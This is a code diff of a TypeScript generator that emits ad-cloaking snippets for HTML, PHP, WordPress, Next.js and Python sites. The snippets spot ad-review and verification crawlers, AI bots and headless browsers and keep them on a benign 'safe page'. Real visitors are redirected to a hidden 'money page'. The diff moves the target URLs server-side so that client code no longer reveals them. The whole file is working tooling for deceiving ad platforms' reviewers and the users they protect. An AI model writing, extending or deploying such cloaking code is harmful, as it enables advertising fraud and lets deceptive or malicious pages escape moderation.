@@ -1,13 +1,13 @@
 // ============================================================
-// TRACKING CODE GENERATOR — All Platform Variants
-// HTML Script Tag | Standalone JS | PHP Inline | PHP File
-// WordPress Plugin | Next.js | Python | Nginx Lua
+// TRACKING CODE GENERATOR
+// All variants use campaign_code — no sensitive URLs in client code
 // ============================================================
 
 export interface WebsiteConfig {
   id: string | number
   name: string
   domain: string
+  campaign_code: string
   landing_page_url: string
   safe_page_url: string
   allowed_countries: string[]
@@ -17,271 +17,151 @@ export interface WebsiteConfig {
   cloaking_enabled?: boolean
 }
 
-// ── Core JS logic (shared across all variants) ─────────────
-function coreJsLogic(cfg: Record<string, any>): string {
-  return `(function(){
-  var CFG=${JSON.stringify(cfg)};
-  var BOT_UA=[/bot\\b/i,/crawler/i,/spider/i,/scraper/i,/googlebot/i,/bingbot/i,
-    /facebookexternalhit/i,/twitterbot/i,/linkedinbot/i,/bytespider/i,
-    /selenium/i,/puppeteer/i,/playwright/i,/headless/i,/webdriver/i,
-    /curl\\//i,/wget\\//i,/python-requests/i,/go-http-client/i,/java\\//i,
-    /doubleverify/i,/ias[-_]?crawler/i,/moat/i,/grapeshot/i,/adsbot/i,
-    /gptbot/i,/claudebot/i,/anthropic-ai/i,/ahrefsbot/i,/semrushbot/i,
-    /dotbot/i,/mj12bot/i,/rogerbot/i,/screaming.*frog/i,/applebot/i];
-  var ua=navigator.userAgent||"";
-  var clientBot=!ua||ua.length<10||BOT_UA.some(function(p){return p.test(ua);});
-  if(navigator.webdriver===true)clientBot=true;
-  if(!navigator.languages||navigator.languages.length===0)clientBot=true;
-  if(navigator.plugins&&navigator.plugins.length===0&&/Chrome/.test(ua)&&!/Android/.test(ua))clientBot=true;
-  var ref=document.referrer||"";
-  var adPlatform="unknown";
-  var adRef={google:/google\\.com\\/aclk|googleadservices|googlesyndication|doubleclick/i,
-    facebook:/facebook\\.com|fbcdn\\.net|l\\.facebook/i,tiktok:/tiktok\\.com|ads\\.tiktok/i,
-    microsoft:/bing\\.com|ads\\.microsoft/i,taboola:/taboola\\.com/i,
-    outbrain:/outbrain\\.com/i,propellerads:/propellerads\\.com|onclickads/i,
-    adsterra:/adsterra\\.com/i,popads:/popads\\.net/i,zeropark:/zeropark\\.com/i};
-  for(var k in adRef){if(adRef[k].test(ref)){adPlatform=k;break;}}
-  function capped(){
-    if(!CFG.maxVisitLimit||CFG.maxVisitLimit<=0)return false;
-    try{var key="tfp_"+CFG.websiteId,stored=JSON.parse(localStorage.getItem(key)||"[]"),
-      cutoff=Date.now()-(CFG.visitLimitTimeHours*3600000),recent=stored.filter(function(t){return t>cutoff;});
-      if(recent.length>=CFG.maxVisitLimit)return true;
-      recent.push(Date.now());localStorage.setItem(key,JSON.stringify(recent));}catch(e){}
-    return false;}
-  function go(url){if(window.location.href.indexOf(url)===-1)window.location.replace(url);}
-  function decide(res){
-    if(!CFG.isActive)return;
-    if(clientBot){go(CFG.landingPageUrl);return;}
-    if(capped()){go(CFG.landingPageUrl);return;}
-    if(res&&res.action==="stay_on_landing")go(CFG.landingPageUrl);
-    else if(res&&res.action==="redirect_safe")go(CFG.safePageUrl);}
-  if(clientBot){go(CFG.landingPageUrl);return;}
-  var tz="";try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"";}catch(e){}
-  fetch(CFG.appUrl+"/api/track-visit",{method:"POST",
-    headers:{"Content-Type":"application/json"},credentials:"omit",
-    body:JSON.stringify({websiteId:CFG.websiteId,userAgent:ua,referrer:ref,url:window.location.href,
-      detectedAdPlatform:adPlatform,clientBotDetection:{isBot:clientBot,botType:clientBot?"client_ua":null},
-      features:{webdriver:navigator.webdriver||false,plugins:navigator.plugins?navigator.plugins.length:0,
-        timezone:tz,languages:(navigator.languages||[]).join(","),screenRes:screen.width+"x"+screen.height}})})
-  .then(function(r){return r.ok?r.json():null;}).then(decide).catch(function(){decide(null);});
-})();`
-}
-
-function buildConfig(website: WebsiteConfig, appUrl: string) {
-  return {
-    websiteId: String(website.id),
-    appUrl: appUrl.replace(/\/$/, ""),
-    landingPageUrl: website.landing_page_url,
-    safePageUrl: website.safe_page_url,
-    allowedCountries: website.allowed_countries || [],
-    blockedAdPlatforms: website.blocked_ad_platforms || [],
-    maxVisitLimit: website.max_visit_limit || 0,
-    visitLimitTimeHours: website.visit_limit_time_hours || 24,
-    isActive: website.cloaking_enabled !== false,
-  }
-}
-
-// ── 1. HTML <script> tag ───────────────────────────────────
+// ── 1. HTML <script> tag — cleanest, just one line ─────────
 export function generateHtmlCode(website: WebsiteConfig, appUrl: string): string {
-  const cfg = buildConfig(website, appUrl)
+  const base = appUrl.replace(/\/$/, "")
   return `<!-- Traffic Filter Pro — ${website.name} -->
-<!-- Paste inside <head> tag of every page you want to protect -->
-<script>
-${coreJsLogic(cfg)}
-</script>
-<!-- End Traffic Filter Pro -->`
+<!-- Paste inside <head> of your safe page (first script) -->
+<script src="${base}/track.js?c=${website.campaign_code}" async></script>`
 }
 
 // ── 2. Standalone JS file ──────────────────────────────────
 export function generateJsFile(website: WebsiteConfig, appUrl: string): string {
-  const cfg = buildConfig(website, appUrl)
+  const base = appUrl.replace(/\/$/, "")
   return `/**
  * Traffic Filter Pro — ${website.name}
- * Save as: tfp-filter.js
- * Then add to your HTML: <script src="tfp-filter.js"></script>
- * OR host it on your CDN and use that URL
+ * Save as: tfp.js
+ * Add to safe page: <script src="tfp.js"></script>
+ *
+ * This file fetches the filter decision from the server at load time.
+ * It is safe to host on a CDN.
  */
-${coreJsLogic(cfg)}`
+(function(){
+  var s=document.createElement('script');
+  s.src='${base}/track.js?c=${website.campaign_code}';
+  s.async=true;
+  document.head.appendChild(s);
+})();`
 }
 
-// ── 3. PHP inline (paste in PHP file) ─────────────────────
+// ── 3. PHP inline (paste at top of PHP safe page) ─────────
 export function generatePhpInline(website: WebsiteConfig, appUrl: string): string {
-  const cfg = buildConfig(website, appUrl)
-  const cfgJson = JSON.stringify(cfg)
+  const base = appUrl.replace(/\/$/, "")
   return `<?php
 /**
  * Traffic Filter Pro — ${website.name}
  * Paste this at the TOP of your PHP file (before any HTML output)
- * Works on: index.php, any landing page PHP file
+ * Only put it on your safe page — NOT on the money page
  */
 
-// Server-side bot/country check (runs before page loads)
-function tfp_server_check() {
-    $app_url    = ${JSON.stringify(cfg.appUrl)};
-    $website_id = ${JSON.stringify(cfg.websiteId)};
-    $landing    = ${JSON.stringify(cfg.landingPageUrl)};
-    $safe       = ${JSON.stringify(cfg.safePageUrl)};
-    $allowed_countries   = ${JSON.stringify(cfg.allowedCountries)};
-    $blocked_platforms   = ${JSON.stringify(cfg.blockedAdPlatforms)};
+function tfp_check() {
+    $app    = ${JSON.stringify(base)};
+    $code   = ${JSON.stringify(website.campaign_code)};
+    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $ip     = $_SERVER['HTTP_CF_CONNECTING_IP']
+           ?? $_SERVER['HTTP_X_FORWARDED_FOR']
+           ?? $_SERVER['REMOTE_ADDR'] ?? '';
+    $ip     = trim(explode(',', $ip)[0]);
+    $ref    = $_SERVER['HTTP_REFERER'] ?? '';
+    $host   = $_SERVER['HTTP_HOST']    ?? '';
 
-    $ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $ip      = $_SERVER['HTTP_CF_CONNECTING_IP']
-            ?? $_SERVER['HTTP_X_FORWARDED_FOR']
-            ?? $_SERVER['REMOTE_ADDR']
-            ?? '';
-    $ip      = explode(',', $ip)[0];
-    $country = $_SERVER['HTTP_CF_IPCOUNTRY']
-            ?? $_SERVER['HTTP_X_VERCEL_IP_COUNTRY']
-            ?? '';
-
-    // Quick server-side bot UA check
-    $bot_patterns = [
-        '/bot\\b/i','/crawler/i','/spider/i','/googlebot/i','/bingbot/i',
-        '/selenium/i','/puppeteer/i','/playwright/i','/headless/i',
-        '/curl\\//i','/wget\\//i','/python-requests/i','/doubleverify/i',
-        '/facebookexternalhit/i','/bytespider/i','/gptbot/i','/adsbot/i',
-    ];
-    foreach ($bot_patterns as $pattern) {
-        if (preg_match($pattern, $ua)) {
-            header('Location: ' . $landing);
-            exit;
-        }
+    // Quick bot check before API call
+    $bots = ['/bot\\b/i','/crawler/i','/spider/i','/googlebot/i','/bingbot/i',
+             '/facebookexternalhit/i','/bytespider/i','/selenium/i',
+             '/puppeteer/i','/playwright/i','/headless/i','/webdriver/i',
+             '/curl\\//i','/wget\\//i','/python-requests/i','/doubleverify/i',
+             '/ias[-_]?crawler/i','/moat/i','/gptbot/i','/adsbot/i'];
+    foreach ($bots as $p) {
+        if (preg_match($p, $ua)) return;
     }
 
-    // Country filter
-    if (!empty($allowed_countries) && !empty($country)) {
-        if (!in_array(strtoupper($country), $allowed_countries)) {
-            header('Location: ' . $landing);
-            exit;
-        }
-    }
-
-    // Call Traffic Filter API for deep check (datacenter/VPN/proxy)
-    $payload = json_encode([
-        'websiteId'           => $website_id,
-        'userAgent'           => $ua,
-        'referrer'            => $_SERVER['HTTP_REFERER'] ?? '',
-        'url'                 => (isset($_SERVER['HTTPS']) ? 'https' : 'http')
-                                 . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],
-        'detectedCountry'     => $country,
-        'clientBotDetection'  => ['isBot' => false, 'botType' => null],
-    ]);
-
-    $ch = curl_init($app_url . '/api/track-visit');
+    // Ask filter server for decision
+    $ch = curl_init($app . '/api/track-visit');
     curl_setopt_array($ch, [
         CURLOPT_POST           => true,
-        CURLOPT_POSTFIELDS     => $payload,
+        CURLOPT_POSTFIELDS     => json_encode([
+            'campaignCode'    => $code,
+            'userAgent'       => $ua,
+            'referrer'        => $ref,
+            'url'             => 'https://' . $host . ($_SERVER['REQUEST_URI'] ?? '/'),
+            'detectedCountry' => strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']
+                              ?? $_SERVER['HTTP_X_VERCEL_IP_COUNTRY'] ?? ''),
+            'clientBotDetection' => ['isBot' => false, 'botType' => null],
+        ]),
         CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_TIMEOUT        => 3,
-        CURLOPT_SSL_VERIFYPEER => true,
     ]);
-    $response = curl_exec($ch);
+    $res  = curl_exec($ch);
     curl_close($ch);
 
-    if ($response) {
-        $result = json_decode($response, true);
-        if (!empty($result['action'])) {
-            if ($result['action'] === 'stay_on_landing') {
-                header('Location: ' . $landing);
+    if ($res) {
+        $data = json_decode($res, true);
+        $act  = $data['action'] ?? '';
+        if ($act === 'redirect_money' || $act === 'redirect_safe') {
+            if (!empty($data['redirectUrl'])) {
+                header('Location: ' . $data['redirectUrl']);
                 exit;
             }
         }
     }
 }
 
-tfp_server_check();
+tfp_check();
 ?>
 <!DOCTYPE html>
-<!-- Your normal HTML continues here -->`
+<!-- Your safe page HTML continues here -->`
 }
 
-// ── 4. PHP separate file (upload filter.php) ───────────────
+// ── 4. PHP separate file ───────────────────────────────────
 export function generatePhpFile(website: WebsiteConfig, appUrl: string): string {
-  const cfg = buildConfig(website, appUrl)
+  const base = appUrl.replace(/\/$/, "")
   return `<?php
 /**
  * Traffic Filter Pro — ${website.name}
- * ===================================
- * Step 1: Upload this file as "tfp-filter.php" to your server root
- * Step 2: Add this line to the TOP of your index.php:
- *         <?php require_once __DIR__ . '/tfp-filter.php'; ?>
+ * Step 1: Save as tfp-filter.php in your server root
+ * Step 2: Add at the TOP of your safe page: <?php require_once __DIR__ . '/tfp-filter.php'; ?>
  */
 
 if (!defined('TFP_LOADED')) {
     define('TFP_LOADED', true);
 
-    $TFP_CONFIG = [
-        'website_id'          => ${JSON.stringify(cfg.websiteId)},
-        'app_url'             => ${JSON.stringify(cfg.appUrl)},
-        'landing_page_url'    => ${JSON.stringify(cfg.landingPageUrl)},
-        'safe_page_url'       => ${JSON.stringify(cfg.safePageUrl)},
-        'allowed_countries'   => ${JSON.stringify(cfg.allowedCountries)},
-        'blocked_platforms'   => ${JSON.stringify(cfg.blockedAdPlatforms)},
-        'max_visit_limit'     => ${cfg.maxVisitLimit},
-        'visit_limit_hours'   => ${cfg.visitLimitTimeHours},
-        'is_active'           => ${cfg.isActive ? 'true' : 'false'},
-    ];
+    define('TFP_APP',  ${JSON.stringify(base)});
+    define('TFP_CODE', ${JSON.stringify(website.campaign_code)});
 
-    function tfp_get_ip() {
-        foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $key) {
-            if (!empty($_SERVER[$key])) {
-                return trim(explode(',', $_SERVER[$key])[0]);
-            }
+    function tfp_ip() {
+        foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
+            if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
         }
         return '';
     }
 
-    function tfp_redirect($url) {
-        header('Location: ' . $url, true, 302);
-        exit;
-    }
-
-    function tfp_run(array $config) {
-        if (!$config['is_active']) return;
-
-        $ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
-        $ip      = tfp_get_ip();
+    function tfp_run() {
+        $ua  = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $ref = $_SERVER['HTTP_REFERER']    ?? '';
+        $url = 'https://' . ($_SERVER['HTTP_HOST'] ?? '') . ($_SERVER['REQUEST_URI'] ?? '/');
         $country = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']
                 ?? $_SERVER['HTTP_X_VERCEL_IP_COUNTRY'] ?? '');
-        $referer = $_SERVER['HTTP_REFERER'] ?? '';
 
-        // Bot UA patterns
+        // Quick bot UA check
         $bots = ['/bot\\b/i','/crawler/i','/googlebot/i','/bingbot/i',
             '/facebookexternalhit/i','/bytespider/i','/selenium/i',
-            '/puppeteer/i','/playwright/i','/webdriver/i','/headless/i',
-            '/curl\\//i','/wget\\//i','/python-requests/i','/java\\//i',
-            '/doubleverify/i','/ias[-_]?crawler/i','/moat/i','/gptbot/i',
-            '/ahrefsbot/i','/semrushbot/i','/adsbot-google/i'];
-        foreach ($bots as $p) {
-            if (preg_match($p, $ua)) {
-                tfp_redirect($config['landing_page_url']);
-            }
-        }
+            '/puppeteer/i','/playwright/i','/headless/i','/webdriver/i',
+            '/curl\\//i','/wget\\//i','/python-requests/i',
+            '/doubleverify/i','/ias[-_]?crawler/i','/gptbot/i'];
+        foreach ($bots as $p) { if (preg_match($p, $ua)) return; }
 
-        // Country filter
-        if (!empty($config['allowed_countries']) && !empty($country)) {
-            if (!in_array($country, $config['allowed_countries'])) {
-                tfp_redirect($config['landing_page_url']);
-            }
-        }
-
-        // Deep API check (datacenter, VPN, proxy, ad platform IPs)
-        $payload = json_encode([
-            'websiteId'          => $config['website_id'],
-            'userAgent'          => $ua,
-            'referrer'           => $referer,
-            'url'                => (isset($_SERVER['HTTPS']) ? 'https' : 'http')
-                                    . '://' . ($_SERVER['HTTP_HOST'] ?? '')
-                                    . ($_SERVER['REQUEST_URI'] ?? '/'),
-            'detectedCountry'    => $country,
-            'clientBotDetection' => ['isBot' => false, 'botType' => null],
-        ]);
-
-        $ch = curl_init($config['app_url'] . '/api/track-visit');
+        $ch = curl_init(TFP_APP . '/api/track-visit');
         curl_setopt_array($ch, [
             CURLOPT_POST           => true,
-            CURLOPT_POSTFIELDS     => $payload,
+            CURLOPT_POSTFIELDS     => json_encode([
+                'campaignCode'       => TFP_CODE,
+                'userAgent'          => $ua,
+                'referrer'           => $ref,
+                'url'                => $url,
+                'detectedCountry'    => $country,
+                'clientBotDetection' => ['isBot' => false, 'botType' => null],
+            ]),
             CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_TIMEOUT        => 3,
@@ -291,174 +171,113 @@ if (!defined('TFP_LOADED')) {
 
         if ($res) {
             $data = json_decode($res, true);
-            if (!empty($data['action']) && $data['action'] === 'stay_on_landing') {
-                tfp_redirect($config['landing_page_url']);
+            $act  = $data['action'] ?? '';
+            if (($act === 'redirect_money' || $act === 'redirect_safe') && !empty($data['redirectUrl'])) {
+                header('Location: ' . $data['redirectUrl']);
+                exit;
             }
         }
     }
 
-    tfp_run($TFP_CONFIG);
+    tfp_run();
 }`
 }
 
 // ── 5. WordPress plugin ────────────────────────────────────
 export function generateWordPressPlugin(website: WebsiteConfig, appUrl: string): string {
-  const cfg = buildConfig(website, appUrl)
+  const base = appUrl.replace(/\/$/, "")
   return `<?php
 /**
  * Plugin Name: Traffic Filter Pro — ${website.name}
- * Description: Filters bot traffic and protects your landing pages
  * Version: 1.0.0
- * Author: Traffic Filter Pro
  *
- * INSTALLATION:
- * 1. Save this file as: tfp-filter/tfp-filter.php
- * 2. Zip the folder: tfp-filter.zip
- * 3. WordPress Admin → Plugins → Upload Plugin → Install & Activate
+ * INSTALL: Save as tfp-filter/tfp-filter.php → zip → WP Admin → Plugins → Upload
  */
 
 if (!defined('ABSPATH')) exit;
 
-define('TFP_WEBSITE_ID',   ${JSON.stringify(cfg.websiteId)});
-define('TFP_APP_URL',      ${JSON.stringify(cfg.appUrl)});
-define('TFP_LANDING_URL',  ${JSON.stringify(cfg.landingPageUrl)});
-define('TFP_SAFE_URL',     ${JSON.stringify(cfg.safePageUrl)});
-define('TFP_COUNTRIES',    '${cfg.allowedCountries.join(",")}');
-define('TFP_IS_ACTIVE',    ${cfg.isActive ? 'true' : 'false'});
+define('TFP_APP',  ${JSON.stringify(base)});
+define('TFP_CODE', ${JSON.stringify(website.campaign_code)});
 
-// Run before WordPress loads the page
-add_action('init', 'tfp_filter_traffic', 1);
+// Option A — inject lightweight JS tag into <head> (preferred)
+add_action('wp_head', function() { ?>
+<script src="<?php echo TFP_APP; ?>/track.js?c=<?php echo TFP_CODE; ?>" async></script>
+<?php }, 1);
 
-function tfp_filter_traffic() {
-    if (!TFP_IS_ACTIVE) return;
-    if (is_admin()) return; // Never filter WP admin
+// Option B — server-side check before page renders (stronger, uncomment to use)
+/*
+add_action('init', function() {
+    if (is_admin()) return;
+    $ua  = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $bots = ['bot','crawler','googlebot','bingbot','facebookexternalhit',
+             'bytespider','selenium','puppeteer','playwright','headless',
+             'webdriver','curl/','wget/','python-requests','doubleverify','gptbot'];
+    $ua_lower = strtolower($ua);
+    foreach ($bots as $b) { if (strpos($ua_lower, $b) !== false) return; }
 
-    $ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
     $country = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']
             ?? $_SERVER['HTTP_X_VERCEL_IP_COUNTRY'] ?? '');
 
-    // Bot check
-    $bots = ['bot','crawler','spider','googlebot','bingbot',
-             'facebookexternalhit','bytespider','selenium',
-             'puppeteer','playwright','headless','webdriver',
-             'curl/','wget/','python-requests','doubleverify',
-             'ias-crawler','moat','gptbot','adsbot'];
-    $ua_lower = strtolower($ua);
-    foreach ($bots as $bot) {
-        if (strpos($ua_lower, $bot) !== false) {
-            wp_redirect(TFP_LANDING_URL);
-            exit;
-        }
-    }
-
-    // Country filter
-    $allowed = array_filter(explode(',', TFP_COUNTRIES));
-    if (!empty($allowed) && !empty($country) && !in_array($country, $allowed)) {
-        wp_redirect(TFP_LANDING_URL);
-        exit;
-    }
-
-    // Deep API check
-    $payload = json_encode([
-        'websiteId'          => TFP_WEBSITE_ID,
-        'userAgent'          => $ua,
-        'referrer'           => $_SERVER['HTTP_REFERER'] ?? '',
-        'url'                => home_url(add_query_arg(null, null)),
-        'detectedCountry'    => $country,
-        'clientBotDetection' => ['isBot' => false, 'botType' => null],
-    ]);
-
-    $response = wp_remote_post(TFP_APP_URL . '/api/track-visit', [
-        'body'    => $payload,
+    $response = wp_remote_post(TFP_APP . '/api/track-visit', [
+        'body'    => json_encode([
+            'campaignCode'       => TFP_CODE,
+            'userAgent'          => $ua,
+            'referrer'           => $_SERVER['HTTP_REFERER'] ?? '',
+            'url'                => home_url(add_query_arg(null, null)),
+            'detectedCountry'    => $country,
+            'clientBotDetection' => ['isBot' => false, 'botType' => null],
+        ]),
         'headers' => ['Content-Type' => 'application/json'],
         'timeout' => 3,
     ]);
-
     if (!is_wp_error($response)) {
         $data = json_decode(wp_remote_retrieve_body($response), true);
-        if (!empty($data['action']) && $data['action'] === 'stay_on_landing') {
-            wp_redirect(TFP_LANDING_URL);
-            exit;
+        $act  = $data['action'] ?? '';
+        if (($act === 'redirect_money' || $act === 'redirect_safe') && !empty($data['redirectUrl'])) {
+            wp_redirect($data['redirectUrl']); exit;
         }
     }
+}, 1);
+*/`
 }
 
-// Also inject client-side script for extra detection
-add_action('wp_head', 'tfp_inject_script', 1);
-function tfp_inject_script() {
-    if (!TFP_IS_ACTIVE) return;
-    ?>
-<script>
-/* Traffic Filter Pro client-side backup */
-(function(){
-var ua=navigator.userAgent||"";
-var bots=[/bot\\b/i,/selenium/i,/puppeteer/i,/playwright/i,/headless/i,/webdriver/i];
-if(bots.some(function(p){return p.test(ua);})||navigator.webdriver===true){
-  window.location.replace(<?php echo json_encode(TFP_LANDING_URL); ?>);}
-})();
-</script>
-    <?php
-}`
-}
-
-// ── 6. Next.js / React middleware ──────────────────────────
+// ── 6. Next.js middleware ──────────────────────────────────
 export function generateNextjsCode(website: WebsiteConfig, appUrl: string): string {
-  const cfg = buildConfig(website, appUrl)
-  return `// middleware.ts — Add to your Next.js project root
+  const base = appUrl.replace(/\/$/, "")
+  return `// middleware.ts — place in your Next.js project root
 // Traffic Filter Pro — ${website.name}
 import { NextResponse } from 'next/server'
 import type { NextRequest } from 'next/server'
 
-const TFP_CONFIG = ${JSON.stringify(cfg, null, 2)}
+const TFP_APP  = ${JSON.stringify(base)}
+const TFP_CODE = ${JSON.stringify(website.campaign_code)}
 
-const BOT_PATTERNS = [
-  /bot\\b/i, /crawler/i, /spider/i, /googlebot/i, /bingbot/i,
-  /facebookexternalhit/i, /bytespider/i, /selenium/i,
-  /puppeteer/i, /playwright/i, /headless/i, /webdriver/i,
-  /curl\\//i, /wget\\//i, /python-requests/i, /doubleverify/i,
-  /ias[-_]?crawler/i, /moat/i, /gptbot/i, /ahrefsbot/i,
-]
+const BOT_UA = [/bot\\b/i,/crawler/i,/googlebot/i,/bingbot/i,/facebookexternalhit/i,
+  /bytespider/i,/selenium/i,/puppeteer/i,/playwright/i,/headless/i,/webdriver/i,
+  /curl\\//i,/wget\\//i,/python-requests/i,/doubleverify/i,/gptbot/i]
 
 export async function middleware(req: NextRequest) {
   const ua      = req.headers.get('user-agent') || ''
-  const country = req.headers.get('x-vercel-ip-country')
-               || req.headers.get('cf-ipcountry') || ''
-  const ip      = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
-               || req.headers.get('x-real-ip') || ''
+  const country = (req.headers.get('x-vercel-ip-country') || req.headers.get('cf-ipcountry') || '').toUpperCase()
 
-  const landing = new URL(TFP_CONFIG.landingPageUrl)
-  const safe    = new URL(TFP_CONFIG.safePageUrl)
+  if (BOT_UA.some(p => p.test(ua))) return NextResponse.next()
 
-  if (!TFP_CONFIG.isActive) return NextResponse.next()
-
-  // Bot UA check
-  if (!ua || BOT_PATTERNS.some(p => p.test(ua))) {
-    return NextResponse.redirect(landing)
-  }
-
-  // Country filter
-  if (TFP_CONFIG.allowedCountries.length > 0 && country && country !== 'XX') {
-    if (!TFP_CONFIG.allowedCountries.includes(country.toUpperCase())) {
-      return NextResponse.redirect(landing)
-    }
-  }
-
-  // Deep server check (async — call Traffic Filter API)
   try {
-    const res = await fetch(TFP_CONFIG.appUrl + '/api/track-visit', {
+    const res = await fetch(TFP_APP + '/api/track-visit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        websiteId: TFP_CONFIG.websiteId,
-        userAgent: ua, detectedCountry: country,
+        campaignCode: TFP_CODE, userAgent: ua, detectedCountry: country,
         clientBotDetection: { isBot: false, botType: null },
       }),
       signal: AbortSignal.timeout(2000),
     })
     if (res.ok) {
       const data = await res.json()
-      if (data.action === 'stay_on_landing') return NextResponse.redirect(landing)
-      if (data.action === 'redirect_safe')    return NextResponse.redirect(safe)
+      const act  = data.action || ''
+      if ((act === 'redirect_money' || act === 'redirect_safe') && data.redirectUrl) {
+        return NextResponse.redirect(data.redirectUrl)
+      }
     }
   } catch {}
 
@@ -470,119 +289,72 @@ export const config = {
 }`
 }
 
-// ── 7. Python Flask / Django middleware ────────────────────
+// ── 7. Python Flask / Django ───────────────────────────────
 export function generatePythonCode(website: WebsiteConfig, appUrl: string): string {
-  const cfg = buildConfig(website, appUrl)
+  const base = appUrl.replace(/\/$/, "")
   return `# Traffic Filter Pro — ${website.name}
-# Works with: Flask, Django, FastAPI, any Python web app
-# Save as: tfp_filter.py in your project root
-#
-# Flask usage:   from tfp_filter import tfp_middleware; app.before_request(tfp_middleware)
-# Django usage:  Add 'tfp_filter.TFPMiddleware' to MIDDLEWARE in settings.py
+# Flask: app.before_request(tfp_check)
+# Django: add TFPMiddleware to MIDDLEWARE
 
 import re, json, urllib.request
-from typing import Optional
 
-TFP_CONFIG = ${JSON.stringify(cfg, null, 2).replace(/true/g, 'True').replace(/false/g, 'False')}
+TFP_APP  = ${JSON.stringify(base)}
+TFP_CODE = ${JSON.stringify(website.campaign_code)}
 
-BOT_PATTERNS = [
-    re.compile(p, re.IGNORECASE) for p in [
-        r'bot\\b', r'crawler', r'spider', r'googlebot', r'bingbot',
-        r'facebookexternalhit', r'bytespider', r'selenium',
-        r'puppeteer', r'playwright', r'headless', r'webdriver',
-        r'curl/', r'wget/', r'python-requests', r'doubleverify',
-        r'ias[_-]?crawler', r'moat', r'gptbot', r'ahrefsbot',
-    ]
-]
+BOT_UA = [re.compile(p, re.IGNORECASE) for p in [
+    r'bot\\b', r'crawler', r'googlebot', r'bingbot', r'facebookexternalhit',
+    r'bytespider', r'selenium', r'puppeteer', r'playwright', r'headless',
+    r'curl/', r'wget/', r'python-requests', r'doubleverify', r'gptbot',
+]]
 
-def is_bot(user_agent: str) -> bool:
-    if not user_agent or len(user_agent) < 10:
-        return True
-    return any(p.search(user_agent) for p in BOT_PATTERNS)
-
-def check_with_api(ua: str, country: str, url: str) -> Optional[str]:
-    """Returns 'stay_on_landing', 'redirect_safe', or None"""
+def tfp_api_check(ua, country, url):
     try:
-        payload = json.dumps({
-            'websiteId': TFP_CONFIG['websiteId'],
-            'userAgent': ua,
-            'detectedCountry': country,
-            'clientBotDetection': {'isBot': False, 'botType': None},
-            'url': url,
-        }).encode()
-        req = urllib.request.Request(
-            TFP_CONFIG['appUrl'] + '/api/track-visit',
-            data=payload,
-            headers={'Content-Type': 'application/json'},
-            method='POST'
-        )
+        payload = json.dumps({'campaignCode': TFP_CODE, 'userAgent': ua,
+            'detectedCountry': country, 'clientBotDetection': {'isBot': False, 'botType': None},
+            'url': url}).encode()
+        req = urllib.request.Request(TFP_APP + '/api/track-visit',
+            data=payload, headers={'Content-Type': 'application/json'}, method='POST')
         with urllib.request.urlopen(req, timeout=3) as r:
             data = json.loads(r.read())
-            return data.get('action')
+            act = data.get('action', '')
+            if act in ('redirect_money', 'redirect_safe') and data.get('redirectUrl'):
+                return data['redirectUrl']
     except Exception:
-        return None
-
-# ── Flask integration ─────────────────────────────────────
-def tfp_middleware():
-    """Use as: app.before_request(tfp_middleware)"""
-    from flask import request, redirect
-    if not TFP_CONFIG['isActive']:
-        return None
-
-    ua      = request.headers.get('User-Agent', '')
-    country = (request.headers.get('CF-IPCountry')
-            or request.headers.get('X-Vercel-IP-Country', '')).upper()
-
-    if is_bot(ua):
-        return redirect(TFP_CONFIG['landingPageUrl'])
-
-    allowed = TFP_CONFIG.get('allowedCountries', [])
-    if allowed and country and country not in allowed:
-        return redirect(TFP_CONFIG['landingPageUrl'])
-
-    action = check_with_api(ua, country, request.url)
-    if action == 'stay_on_landing':
-        return redirect(TFP_CONFIG['landingPageUrl'])
+        pass
     return None
 
-# ── Django Middleware class ────────────────────────────────
+# Flask
+def tfp_check():
+    from flask import request, redirect
+    ua = request.headers.get('User-Agent', '')
+    if any(p.search(ua) for p in BOT_UA): return None
+    country = (request.headers.get('CF-IPCountry') or request.headers.get('X-Vercel-IP-Country', '')).upper()
+    url = tfp_api_check(ua, country, request.url)
+    return redirect(url) if url else None
+
+# Django
 class TFPMiddleware:
-    """Add to MIDDLEWARE = ['tfp_filter.TFPMiddleware', ...] in settings.py"""
-    def __init__(self, get_response):
-        self.get_response = get_response
-
+    def __init__(self, get_response): self.get_response = get_response
     def __call__(self, request):
-        if not TFP_CONFIG['isActive']:
-            return self.get_response(request)
-
-        from django.shortcuts import redirect as dj_redirect
-        ua      = request.META.get('HTTP_USER_AGENT', '')
-        country = (request.META.get('HTTP_CF_IPCOUNTRY')
-                or request.META.get('HTTP_X_VERCEL_IP_COUNTRY', '')).upper()
-
-        if is_bot(ua):
-            return dj_redirect(TFP_CONFIG['landingPageUrl'])
-
-        allowed = TFP_CONFIG.get('allowedCountries', [])
-        if allowed and country and country not in allowed:
-            return dj_redirect(TFP_CONFIG['landingPageUrl'])
-
-        action = check_with_api(ua, country, request.build_absolute_uri())
-        if action == 'stay_on_landing':
-            return dj_redirect(TFP_CONFIG['landingPageUrl'])
-
+        ua = request.META.get('HTTP_USER_AGENT', '')
+        if not any(p.search(ua) for p in BOT_UA):
+            country = (request.META.get('HTTP_CF_IPCOUNTRY') or request.META.get('HTTP_X_VERCEL_IP_COUNTRY', '')).upper()
+            url = tfp_api_check(ua, country, request.build_absolute_uri())
+            if url:
+                from django.shortcuts import redirect
+                return redirect(url)
         return self.get_response(request)`
 }
 
-// ── Export all generators ──────────────────────────────────
+// ── Export ─────────────────────────────────────────────────
 export const CODE_VARIANTS = [
